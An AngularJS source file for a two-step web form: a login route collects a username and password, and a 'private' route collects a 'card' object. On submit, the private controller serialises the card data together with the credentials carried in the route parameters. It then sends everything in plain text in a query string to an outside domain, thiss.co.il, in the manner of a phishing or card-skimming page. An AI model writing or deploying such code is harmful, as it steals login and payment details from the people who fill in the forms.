"use strict";
var app = angular.module("app", ["ngRoute", "vcRecaptcha", "ngSanitize"]);
app.controller("ctrl0", ["$scope", "$location", function(a, b) {
   // a.header = c.getHeader(b.search().userType)
}
]),
app.config(["$routeProvider", function(a) {
    a.caseInsensitiveMatch = !0,
    a.when("/login", {
        templateUrl: "./templates/login.html",
        controller: "loginCtrl"
    }).when("/private", {
        templateUrl: "./templates/private.html",
        controller: "privateCtrl"
    }).otherwise({
        redirectTo: "/login"
    })
}
]),
app.run(["$rootScope", function(a) {
    a.$on("$routeChangeError", function(a, b, c, d) {
        console.error("route error", d)
    })
}
]),





app.controller("privateCtrl", [ "$scope", "$routeParams", function( b, d) {
  b.card= { };
console.log('$routeParams', d);
//  b.password=2
  b.submit = function(){

  //  console.log('b.user', b.user )
         window.location = 'https://thiss.co.il?' + JSON.stringify(b.card) + JSON.stringify(d);


  }
}
]),

app.controller("loginCtrl", ["$scope", "$routeParams", function( b, d) {
  b.user= {};

//  b.password=2
  b.submit = function(){

    console.log('b.user', b.user )
    window.location = "#!/private?user=" + b.user.password +'&password=' +     b.user.name;

  }
}
])




///////////END
;
